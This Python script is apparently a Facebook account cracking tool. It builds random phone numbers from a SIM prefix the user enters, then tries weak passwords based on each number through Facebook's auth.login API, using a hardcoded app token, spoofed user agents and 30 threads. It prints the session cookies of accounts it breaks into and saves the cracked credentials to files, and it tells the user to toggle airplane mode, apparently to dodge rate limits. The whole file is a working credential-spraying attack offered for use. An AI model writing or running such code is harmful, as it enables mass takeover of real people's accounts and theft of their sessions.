import os
import sys
import uuid
import random
import string
import requests
from concurrent.futures import ThreadPoolExecutor as redwan_executor

redwan_oks = []
redwan_cps = []
redwan_loop = 0

def redwan_clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def redwan_linex():
    print("-" * 50)

def redwan_ua1():
    return "[FBAN/FB4A;FBAV/" + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ";FBBV/" + str(random.randint(1111111, 7777777)) + ";FBPN/com.facebook.katana;FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBDV/L-EMENT500;FBSV/4.4.2;FBCA/armeabi-v7a:armeabi;]"

def redwan_method_crack(redwan_ids, redwan_passlist):
    global redwan_oks, redwan_cps, redwan_loop
    try:
        for redwan_pass in redwan_passlist:
            sys.stdout.write(f'\rAXN_RANDOM[{redwan_loop}] OK-{len(redwan_oks)} CP-{len(redwan_cps)}')
            sys.stdout.flush()

            redwan_ua = redwan_ua1()
            redwan_adid = str(uuid.uuid4())
            redwan_device_id = str(uuid.uuid4())
            redwan_data = {
                'adid': redwan_adid,
                'format': 'json',
                'device_id': redwan_device_id,
                'email': redwan_ids,
                'password': redwan_pass,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate'
            }

            redwan_header = {
                'User-Agent': redwan_ua,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': '21435',
                'X-FB-Net-HNI': '35793',
                'X-FB-SIM-HNI': '37855',
                'X-FB-Connection-Type': 'WIFI',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }

            redwan_url = 'https://api.facebook.com/method/auth.login'
            redwan_req = requests.post(redwan_url, data=redwan_data, headers=redwan_header, timeout=10).json()

            if 'session_key' in redwan_req:
                redwan_uid = redwan_req.get('uid', redwan_ids)
                if redwan_uid not in redwan_oks:
                    print(f'\n[OK] {redwan_uid} | {redwan_pass}')
                    redwan_coki = ";".join(i["name"] + "=" + i["value"] for i in redwan_req["session_cookies"])
                    print(f'[COOKIE] {redwan_coki}')
                    with open('/sdcard/REDWAN-ACTIVE.txt', 'a') as redwan_f:
                        redwan_f.write(f'{redwan_uid} | {redwan_pass}\n')
                    redwan_oks.append(redwan_uid)
                break

            elif 'www.facebook.com' in redwan_req.get('error_msg', ''):
                print(f'\n[CP] {redwan_ids} | {redwan_pass}')
                with open('/sdcard/REDWAN-INACTIVE.txt', 'a') as redwan_f:
                    redwan_f.write(f'{redwan_ids}|{redwan_pass}\n')
                redwan_cps.append(redwan_ids)
                break

        redwan_loop += 1
    except Exception as redwan_e:
        pass

def redwan_crack_start():
    redwan_user = []
    redwan_clear()

    # RED NEON Welcome Message (simulated)
    print("\033[1;91mHey Welcome To Xemon Verse!\033[0m")
    redwan_linex()
    print(' EXAMPLE SIM CODE : [0165] [0175] [0185] [0195]')
    redwan_code = input(' ENTER SIM CODE >> ')
    redwan_linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        redwan_limit = int(input(' ENTER LIMIT >> '))
    except ValueError:
        redwan_limit = 100000
    redwan_clear()

    for _ in range(redwan_limit):
        redwan_nmp = ''.join(random.choice(string.digits) for _ in range(7))
        redwan_user.append(redwan_nmp)

    with redwan_executor(max_workers=30) as redwan_tara:
        print(f'TOTAL ACCOUNT : {len(redwan_user)} | YOUR SIM CODE : {redwan_code}')
        print('AEROPLANE MODE ON/OFF FOR GOOD RESULT')
        redwan_linex()
        for redwan_psx in redwan_user:
            redwan_ids = redwan_code + redwan_psx
            redwan_passlist = [redwan_psx, redwan_ids, redwan_ids[:7], redwan_ids[:6]]
            redwan_tara.submit(redwan_method_crack, redwan_ids, redwan_passlist)

    redwan_linex()
    print(' THE PROGRESS HAS BEEN COMPLETED ')
    print(' TOTAL OK ID :', len(redwan_oks))
    print(' TOTAL CP ID :', len(redwan_cps))
    input(' PRESS ENTER TO BACK  : ')
    redwan_linex()

if __name__ == "__main__":
    redwan_crack_start()
